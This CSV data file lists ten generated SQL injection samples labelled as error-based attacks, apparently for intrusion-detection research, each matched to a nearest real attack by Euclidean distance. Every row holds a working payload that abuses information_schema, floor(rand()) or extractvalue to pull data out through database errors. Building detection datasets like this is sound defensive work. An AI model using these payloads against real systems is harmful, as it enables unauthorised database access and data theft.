id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
GAN_000001,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.858146165187044
GAN_000002,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.752809484071104
GAN_000003,attack,error,"1%""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000015,5.921212740509005
GAN_000004,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.865148786382311
GAN_000005,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.834430601261828
GAN_000006,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.93555810140843
GAN_000007,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.848892058150629
GAN_000008,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.81876852473569
GAN_000009,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.837949902197822
GAN_000010,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,5.971263645155
